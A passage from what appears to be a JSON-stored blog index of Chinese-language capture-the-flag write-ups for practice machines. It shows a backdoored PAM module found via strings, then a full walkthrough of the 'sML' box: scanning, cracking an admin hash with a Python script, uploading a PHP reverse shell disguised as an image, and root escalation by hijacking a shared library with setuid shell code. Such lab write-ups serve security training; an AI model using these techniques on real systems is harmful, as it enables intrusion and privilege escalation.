GLIBC_2.2.5\nstpcpy@GLIBC_2.2.5\nyp_master@LIBNSL_1.0\ndcgettext@GLIBC_2.2.5\nstrlen@GLIBC_2.2.5\ngetuid@GLIBC_2.2.5\ndup2@GLIBC_2.2.5\nstrchr@GLIBC_2.2.5\nsnprintf@GLIBC_2.2.5\ngettimeofday@GLIBC_2.2.5\nfputs@GLIBC_2.2.5\nmemset@GLIBC_2.2.5\ngeteuid@GLIBC_2.2.5\npam_modutil_getlogin@LIBPAM_MODUTIL_1.0\nstrncat@GLIBC_2.2.5\nauthunix_create_default@GLIBC_2.2.5\npipe@GLIBC_2.2.5\nyp_match@LIBNSL_1.0\nstrtok_r@GLIBC_2.2.5\npam_sm_chauthtok\nread@GLIBC_2.2.5\nfgets@GLIBC_2.2.5\nexecve@GLIBC_2.2.5\nxdr_string@GLIBC_2.2.5\ncalloc@GLIBC_2.2.5\npam_sm_close_session\n__getdelim@GLIBC_2.2.5\nstrcmp@GLIBC_2.2.5\ngetpwnam@GLIBC_2.2.5\nfeof@GLIBC_2.2.5\n__gmon_start__\numask@GLIBC_2.2.5\nstrtol@GLIBC_2.2.5\nmemcpy@GLIBC_2.14\ntime@GLIBC_2.2.5\nfileno@GLIBC_2.2.5\nmalloc@GLIBC_2.2.5\nstrncasecmp@GLIBC_2.2.5\nfflush@GLIBC_2.2.5\npam_sm_acct_mgmt\nstrsep@GLIBC_2.2.5\n__isoc99_sscanf@GLIBC_2.7\nfgetpwent@GLIBC_2.2.5\nsyslog@GLIBC_2.2.5\n__fxstat@GLIBC_2.2.5\nyp_bind@LIBNSL_1.0\nxdr_int@GLIBC_2.2.5\nfgetspent@GLIBC_2.2.5\ncrypt_r@XCRYPT_2.0\nyperr_string@LIBNSL_1.0\nclnt_sperrno@GLIBC_2.2.5\nfchmod@GLIBC_2.2.5\npam_syslog@LIBPAM_EXTENSION_1.0\nfsync@GLIBC_2.2.5\npam_sm_open_session\nwaitpid@GLIBC_2.2.5\nclnt_create@GLIBC_2.2.5\nfchown@GLIBC_2.2.5\nfopen@GLIBC_2.2.5\nulckpwdf@GLIBC_2.2.5\npam_get_item@LIBPAM_1.0\ndcngettext@GLIBC_2.2.5\nrename@GLIBC_2.2.5\npam_set_data@LIBPAM_1.0\npam_modutil_read@LIBPAM_MODUTIL_1.0\npam_get_user@LIBPAM_1.0\npam_modutil_getspnam@LIBPAM_MODUTIL_1.0\npam_sm_authenticate\nyp_get_default_domain@LIBNSL_1.0\npam_fail_delay@LIBPAM_1.0\n_ITM_registerTMCloneTable\nsetuid@GLIBC_2.2.5\nstrdup@GLIBC_2.2.5\nputpwent@GLIBC_2.2.5\npam_get_authtok@LIBPAM_EXTENSION_1.1\n__cxa_finalize@GLIBC_2.2.5\nfork@GLIBC_2.2.5\ngetrpcport@GLIBC_2.2.5\n__ctype_b_loc@GLIBC_2.3\nusleep@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.note.gnu.build-id\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.data.rel.ro\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n.debug_aranges\n.debug_info\n.debug_abbrev\n.debug_line\n.debug_str\n.debug_loc\n.debug_ranges\n````\n\n\u4e3b\u8981\u662f\u8fd9\u91cc\u6709\u95ee\u9898\n\n```\n...\nauth could not identify password for [%s]\nPAM: Root access granted via backdoor\nbad username [%s]\n660930334\nNo password supplied\n...\n```\n\n\u8c8c\u4f3c\u7559\u4e86\u4e00\u4e2a\u540e\u95e8\n\n```\nmorri@Backdoor1:/opt$ su -\nPassword: \nroot@Backdoor1:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Backdoor1:~# cat /root/root.txt \nflag{root-5d363bb914c59fd1cd2b59e998bedb4f}\n```\n\n\u597d\u7684\u5c31\u662f\u540e\u95e8\uff0c\u54c8\u54c8\u54c8\uff0cdpkg -V\u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u770b\u4e2a\u4eba\u559c\u6b22\n\n```\nroot@Backdoor1:~# dpkg -V\n??5?????? c /etc/irssi.conf\n??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so\n??5?????? c /etc/apache2/apache2.conf\n??5?????? c /etc/grub.d/10_linux\n??5?????? c /etc/grub.d/40_custom\n??5?????? c /etc/sudoers\n??5?????? c /etc/inspircd/inspircd.conf\n??5?????? c /etc/inspircd/inspircd.motd\n??5?????? c /etc/issue\n```\n\nsentence", "top": 0, "createdAt": 1752070804, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-09", "dateLabelColor": "#0969da"}, "P137": {"htmlDir": "docs/post/nei-bu-_sML.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_sML", "postUrl": "post/nei-bu-_sML.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/137", "commentNum": 0, "wordCount": 19282, "description": "![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)\n\n\u590d\u76d8\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sudo arp-scan -l  \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nmap -p- 192.168.205.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT\nNmap scan report for 192.168.205.174\nHost is up (0.00015s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.31 seconds\n                            \n```\n\n\u770bweb\n\n![image-20250710215727831](https://7r1umphk.github.io/image/20250710215727984.webp)\n\n\u8bd5\u4e86\u4e00\u4e0b\u5f31\u5bc6\u7801\uff0c\u53d1\u73b0\u53ef\u4ee5\u7206\u7834user\n\n![image-20250710215818476](https://7r1umphk.github.io/image/20250710215818575.webp)\n\n\u7206\u7834\u7684\u540c\u65f6\u770b\u4e86\u4e00\u4e0b\u6e90\u7801\uff0c\u53d1\u73b0\u4e86\u4ed6\u662f\u4f7f\u7528\u7684\u6a21\u677f\n\n![image-20250710215849837](https://7r1umphk.github.io/image/20250710215850057.webp)\n\n\u4e0b\u8f7d\u4e00\u4efd\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip\n--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip\n\u6b63\u5728\u89e3\u6790\u4e3b\u673a www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...\n\u6b63\u5728\u8fde\u63a5 www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a1391869 (1.3M) [application/zip]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201cemployee_records_system.zip\u201d\n\nemployee_records_system.zip                  100%[============================================================================================>]   1.33M   200KB/s  \u7528\u65f6 6.8s    \n\n2025-07-10 09:59:44 (200 KB/s) - \u5df2\u4fdd\u5b58 \u201cemployee_records_system.zip\u201d [1391869/1391869])\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ unzip employee_records_system.zip\nArchive:  employee_records_system.zip\n   creating: employee_records_system/css/\n  inflating: employee_records_system/css/font-awesome.css  \n  inflating: employee_records_system/css/font-awesome.min.css  \n   creating: employee_records_system/css/images/\n  inflating: employee_records_system/css/images/ui-icons_444444_256x240.png  \n  inflating: employee_records_system/css/images/ui-icons_555555_256x240.png  \n  inflating: employee_records_system/css/images/ui-icons_777620_256x240.png  \n  inflating: employee_records_system/css/images/ui-icons_777777_256x240.png  \n  inflating: employee_records_system/css/images/ui-icons_cc0000_256x240.png  \n  inflating: employee_records_system/css/images/ui-icons_ffffff_256x240.png  \n  inflating: employee_records_system/css/jquery-ui.css  \n  inflating: employee_records_system/css/style.css  \n   creating: employee_records_system/dashboard/\n  inflating: employee_records_system/dashboard/add_employee.php  \n  inflating: employee_records_system/dashboard/add_user.php  \n  inflating: employee_records_system/dashboard/addemployee.php  \n  inflating: employee_records_system/dashboard/adduser.php  \n  inflating: employee_records_system/dashboard/current_employees.php  \n  inflating: employee_records_system/dashboard/edit_employee.php  \n  inflating: employee_records_system/dashboard/editemployee.php  \n  inflating: employee_records_system/dashboard/getData.php  \n  inflating: employee_records_system/dashboard/index.php  \n  inflating: employee_records_system/dashboard/logout.php  \n  inflating: employee_records_system/dashboard/past_employees.php  \n  inflating: employee_records_system/dashboard/retrievedata.php  \n  inflating: employee_records_system/dashboard/settings.php  \n  inflating: employee_records_system/dashboard/uploadID.php  \n  inflating: employee_records_system/dashboard/uploadimage.php  \n   creating: employee_records_system/database file/\n  inflating: employee_records_system/database file/sharp_db.sql  \n   creating: employee_records_system/fonts/\n  inflating: employee_records_system/fonts/FontAwesome.otf  \n  inflating: employee_records_system/fonts/fontawesome-webfont.eot  \n  inflating: employee_records_system/fonts/fontawesome-webfont.svg  \n  inflating: employee_records_system/fonts/fontawesome-webfont.ttf  \n  inflating: employee_records_system/fonts/fontawesome-webfont.woff  \n  inflating: employee_records_system/fonts/fontawesome-webfont.woff2  \n   creating: employee_records_system/images/\n  inflating: employee_records_system/images/body_bg.jpg  \n  inflating: employee_records_system/images/logo.png  \n  inflating: employee_records_system/images/print.png  \n  inflating: employee_records_system/images/times.png  \n   creating: employee_records_system/inc/\n  inflating: employee_records_system/inc/db_connect.php  \n  inflating: employee_records_system/inc/header.php  \n  inflating: employee_records_system/index.php  \n   creating: employee_records_system/js/\n  inflating: employee_records_system/js/global.js  \n  inflating: employee_records_system/js/jquery.mask.js  \n  inflating: employee_records_system/js/jquery.min.js  \n  inflating: employee_records_system/js/jquery-ui.min.js  \n   creating: employee_records_system/phpclasses/\n  inflating: employee_records_system/phpclasses/pagination.php  \n  inflating: employee_records_system/READme.md  \n   creating: employee_records_system/uploads/\n   creating: employee_records_system/uploads/employees_ids/\n  inflating: employee_records_system/uploads/employees_ids/76xq1kHzYEaSZum_47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg  \n  inflating: employee_records_system/uploads/employees_ids/JeytInUiX9OuLEx_no-image-available.png  \n   creating: employee_records_system/uploads/employees_photos/\n  inflating: employee_records_system/uploads/employees_photos/G2IHhlrobeUFmQB_ava.jpg  \n  inflating: employee_records_system/uploads/employees_photos/i0e2fodkG79IDU8_ava.jpg  \n  inflating: employee_records_system/uploads/employees_photos/ZtYMgxRNGcFn9SQ_avatar.jpg  \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd employee_records_system \n                                     \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/employee_records_system]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 25\ndrwxr-xr-x 1 kali kali 4096  7\u670810\u65e5 09:59  .\ndrwxr-xr-x 1 kali kali 8192  7\u670810\u65e5 09:59  ..\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5  css\ndrwxr-xr-x 1 kali kali 4096 2017\u5e74 5\u670821\u65e5  dashboard\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5 'database file'\ndrwxr-xr-x 1 kali kali 4096 2017\u5e74 5\u670821\u65e5  fonts\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5  images\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5  inc\n-rwxr-xr-x 1 kali kali 4037 2021\u5e74 2\u670824\u65e5  index.php\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5  js\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5  phpclasses\n-rwxr-xr-x 1 kali kali  598 2017\u5e74 5\u670821\u65e5  READme.md\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5  uploads\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/employee_records_system]\n\u2514\u2500$ cd 'database file'        \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/x/tmp/employee_records_system/database file]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 7\ndrwxr-xr-x 1 kali kali    0 2017\u5e74 5\u670821\u65e5 .\ndrwxr-xr-x 1 kali kali 4096  7\u670810\u65e5 09:59 ..\n-rwxr-xr-x 1 kali kali 2411 2021\u5e74 2\u670824\u65e5 sharp_db.sql\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/x/tmp/employee_records_system/database file]\n\u2514\u2500$ cat sharp_db.sql  \n-- phpMyAdmin SQL Dump\n-- version 4.5.2\n-- http://www.phpmyadmin.net\n--\n-- Host: 127.0.0.1\n-- Generation Time: May 20, 2017 at 04:21 PM\n-- Server version: 5.7.9\n-- PHP Version: 5.6.16\n\nSET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';\nSET time_zone = '+00:00';\n\n\n/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;\n/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;\n/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;\n/*!40101 SET NAMES utf8mb4 */;\n\n--\n-- Database: `sharp_db`\n--\n\n-- --------------------------------------------------------\n\n--\n-- Table structure for table `sharp_emp`\n--\n\nDROP TABLE IF EXISTS `sharp_emp`;\nCREATE TABLE IF NOT EXISTS `sharp_emp` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `employee_id` text,\n  `first_name` text NOT NULL,\n  `middle_name` text,\n  `last_name` text NOT NULL,\n  `phone` int(11) NOT NULL,\n  `employee_image` text NOT NULL,\n  `id_type` text NOT NULL,\n  `id_number` text NOT NULL,\n  `id_card_image` text NOT NULL,\n  `residence_address` text NOT NULL,\n  `residence_location` text NOT NULL,\n  `residence_direction` text NOT NULL,\n  `residence_gps` text NOT NULL,\n  `next_of_kin` text NOT NULL,\n  `relationship` text NOT NULL,\n  `phone_of_kin` text NOT NULL,\n  `kin_residence` text NOT NULL,\n  `kin_residence_direction` text NOT NULL,\n  `date_employed` date NOT NULL,\n  `job_type` text NOT NULL,\n  `status` text NOT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=MyISAM DEFAULT CHARSET=latin1;\n\n-- --------------------------------------------------------\n\n--\n-- Table structure for table `users`\n--\n\nDROP TABLE IF EXISTS `users`;\nCREATE TABLE IF NOT EXISTS `users` (\n  `user_id` int(11) NOT NULL AUTO_INCREMENT,\n  `firstname` text NOT NULL,\n  `lastname` text NOT NULL,\n  `username` text NOT NULL,\n  `password` text NOT NULL,\n  `accounttype` text NOT NULL,\n  PRIMARY KEY (`user_id`)\n) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;\n\n--\n-- Dumping data for table `users`\n--\n\nINSERT INTO `users` (`user_id`, `firstname`, `lastname`, `username`, `password`, `accounttype`) VALUES\n(1, 'Maxwell', 'Morrison', 'xxx2xy', '10a55271c201e41913764ff95b33248b', 'Admin'),\n(3, 'Maxwell', 'Morrison', 'admins', '02adcdf2171dc7e5757cdd7c0b91fa03', 'Admin');\n\n/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;\n/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;\n/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;\n                                       \n```\n\n\u53d1\u73b0\u4e86\u4e24\u4e2a\u7528\u6237\uff0c\u548c\u5bc6\u7801\u54c8\u5e0c\uff08\u8fd9\u4e2a\u5bc6\u7801hash\u76f4\u63a5\u62ff\u53bbjohn\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u56e0\u4e3a\u5b83\u662f(MD5(MD5(password)+MD5(username)))\u8fd9\u79cd\u67b6\u6784\uff0c\u8fd9\u91cc\u6211\u6ca1\u6709\u5c1d\u8bd5\u4f60\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\uff0c\u8fd8\u8981\u7fa4\u91cc\u7684\u4f6c\u8bf4\u6709\u4e00\u4e2apoc\u53ef\u4ee5\u5229\u7528\uff0c\u6211\u4e5f\u6ca1\u6709\u5c1d\u8bd5\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u4e00\u4e0b`https://www.exploit-db.com/exploits/49596`\uff09\uff0c\u7136\u540e\u6211\u5c31\u76f4\u63a5\u62ffadmins\u7528\u6237\u53bbburp\u7206\u7834\u5bc6\u7801\u4e86\uff0c\u56e0\u4e3a\u5b83\u662f\u9ed8\u8ba4\u5bc6\u7801\uff0c\u800c\u4e14\u8fd9\u4e2a\u6a21\u677f\u597d\u50cf\u662f8\u5e74\u524d\u7684\uff0c\u5927\u6982\u7387\u662f\u5f31\u5bc6\u7801\u6765\u7684\n\n\u5bc6\u7801\u662fadmin123\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ grep -w -n 'admin123' xato-net-10-million-passwords-100000.txt \n15582:admin123\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ grep -w -n 'admin123' rockyou.txt                             \n90006:admin123\n10357629:admin123*\n```\n\n\u633a\u540e\u7684\uff0c\u6240\u4ee5\u76f4\u63a5\u6253poc\u662f\u6700\u5feb\u7684\n\n\u5982\u679c\u4f60\u8ddf\u6211\u4e00\u6837\u767b\u5f55\u8fdb\u6765\u7684\uff0c\u70b9add employee\u7136\u540e\u7167\u7247\u90a3\u91cc\u5148\u4f20\u4e00\u4e2areverse.png(\u53cd\u5f39shell php\u6587\u4ef6)\u4e0a\u53bb\uff0c\u7136\u540e\u6293\u5305\u6539\u540d\u5c31\u597d\u4e86\uff0c\u5b83\u5c31\u53ea\u505a\u4e86\u524d\u7aef\u6821\u9a8c\n\n\u5f00\u6293\u5305\n![image-20250710221057739](https://7r1umphk.github.io/image/20250710221057836.webp)\n\n\u6539\u5305\n\n![image-20250710221154470](https://7r1umphk.github.io/image/20250710221154732.webp)\n\n\u653e\u884c\n\n\u76ee\u5f55\u626b\u63cf\u770b\u770b\u4e0a\u4f20\u76ee\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.174 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.174\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 319] [--> http://192.168.205.174/images/]\n/uploads              (Status: 301) [Size: 320] [--> http://192.168.205.174/uploads/]\n/.php                 (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n/css                  (Status: 301) [Size: 316] [--> http://192.168.205.174/css/]\n/index.php            (Status: 200) [Size: 1926]\n/js                   (Status: 301) [Size: 315] [--> http://192.168.205.174/js/]\n/inc                  (Status: 301) [Size: 316] [--> http://192.168.205.174/inc/]\n/fonts                (Status: 301) [Size: 318] [--> http://192.168.205.174/fonts/]\n/dashboard            (Status: 301) [Size: 322] [--> http://192.168.205.174/dashboard/]\nProgress: 34475 / 1102800 (3.13%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 35514 / 1102800 (3.22%)\n===============================================================\nFinished\n===============================================================\n                      \n```\n\n![image-20250710221300132](https://7r1umphk.github.io/image/20250710221300285.webp)\n\nkali\u5f00\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lnvp 8888           \nlistening on [any] 8888 ...\n\n```\n\n\u89e6\u53d1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lnvp 8888           \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.174] 54352\nLinux sML 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux\n 10:13:26 up 18 min,  0 users,  load average: 0.38, 0.16, 0.06\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (430): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@sML:/$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u627e\u63d0\u6743\n\n```\nwww-data@sML:/$ cd /h\ncd /home/yulian/\nwww-data@sML:/home/yulian$ ls -al\nls -al\ntotal 44\ndrwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .\ndrwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..\nlrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -> /dev/null\n-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout\n-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc\n-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile\n-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root\n-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt\nwww-data@sML:/home/yulian$ cat us\ncat user.txt \nflag{user-fde7951c3a57bc71b03631a9673ab67e}\nwww-data@sML:/home/yulian$ strings get_root\nstrings get_root\n/lib64/ld-linux-x86-64.so.2\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nhello\nputs\n__cxa_finalize\n__libc_start_main\nlibxxoo.so\nlibc.so.6\nGLIBC_2.2.5\n/usr/lib/sML\nu/UH\n[]A\\A]A^A_\nStarting get_root program...\n;*3$'\nGCC: (Debian 10.2.1-6) 10.2.1 20210110\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.0\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nget_root.c\n__FRAME_END__\n__init_array_end\n_DYNAMIC\n__init_array_start\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_csu_fini\n_ITM_deregisterTMCloneTable\nputs@GLIBC_2.2.5\n_edata\n__libc_start_main@GLIBC_2.2.5\nhello\n__data_start\n__gmon_start__\n__dso_handle\n_IO_stdin_used\n__libc_csu_init\n__bss_start\nmain\n__TMC_END__\n_ITM_registerTMCloneTable\n__cxa_finalize@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.gnu.build-id\n.note.ABI-tag\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n```\n\n\u7fa4\u4e3b\u90a3\u4e2axxoo\u771f\u662f\u592a\u9192\u76ee\u4e86\n![image-20250710222034547](https://7r1umphk.github.io/image/20250710222034668.webp)\n\n\u90a3\u5c31\u52a8\u6001\u94fe\u63a5\u5e93\u52ab\u6301\u5427\n\n```\nwww-data@sML:/home/yulian$ ls -al /usr/lib/sML\nls -al /usr/lib/sML\ntotal 24\ndrwxr-xr-x  2 root root  4096 Jul  7 06:32 .\ndrwxr-xr-x 71 root root  4096 Jul  7 06:29 ..\n-rwxrwxrwx  1 root root 15984 Jul  7 06:30 libxxoo.so\nwww-data@sML:/home/yulian$ cd /tmp\ncd /tmp\nwww-data@sML:/tmp$ cat << EOF > shell.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid hello() {\n    setuid(0);\n    setgid(0);\n    system('/bin/bash -p');\n}\nEOFcat << EOF > shell.c\n> #include <stdio.h>\n> #include <stdlib.h>\n> #include <unistd.h>\n> \n> void hello() {\n>     setuid(0);\n>     setgid(0);\n>     system('/bin/bash -p');\n> }\n> \nEOF\nwww-data@sML:/tmp$ gcc -shared -o libxxoo.so -fPIC shell.c\ngcc -shared -o libxxoo.so -fPIC shell.c\nwww-data@sML:/tmp$ cp libxxoo.so /usr/lib/sML/\ncp libxxoo.so /usr/lib/sML/\nwww-data@sML:/tmp$ cd /h \ncd /home/yulian/\nwww-data@sML:/home/yulian$ ls -al\nls -al\ntotal 44\ndrwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .\ndrwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..\nlrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -> /dev/null\n-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout\n-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc\n-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile\n-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root\n-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt\nwww-data@sML:/home/yulian$ ./get_root\n./get_root\nid\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\ncat /root/root.txt\nflag{root-4c850c5b3b2756e67a91bad8e046ddac}\n```\n\n\u7206\u7834hash\u53c2\u8003\u4ee3\u7801\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat a.py           \nimport hashlib\n\ndef crack():\n    u = 'admins'\n    h = '02adcdf2171dc7e5757cdd7c0b91fa03'\n    w = r'/usr/share/wordlists/rockyou.txt'\n\n    umd5 = hashlib.md5(u.encode()).hexdigest()\n\n    try:\n        with open(w, 'r', encoding='latin-1') as f:\n            for line in f:\n                p = line.strip()\n                pm = hashlib.md5(p.encode()).hexdigest()\n                cm = hashlib.md5((pm + umd5).encode()).hexdigest()\n                if cm == h:\n                    print(f'[+] \u5bc6\u7801\u627e\u5230: {p}')\n                    return\n        print('[-] \u672a\u627e\u5230')\n    except:\n        print('\u6587\u4ef6\u9519\u8bef')\n\nif __name__ == '__main__':\n    crack()\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 a.py\n[+] \u5bc6\u7801\u627e\u5230: admin123\n                                                 \n```\n\nsentence", "top": 0, "createdAt": 1752158433, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-10", "dateLabelColor": "#0969da"}, "P138": {"htmlDir": "docs/post/nei-bu-_sudo.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_sudo", "postUrl": "post/nei-bu-_sudo.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/138", "commentNum": 0, "wordCount": 17625, "description": "![image-20250711174235043](https://7r1umphk.github.io/image/20250711174242755.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 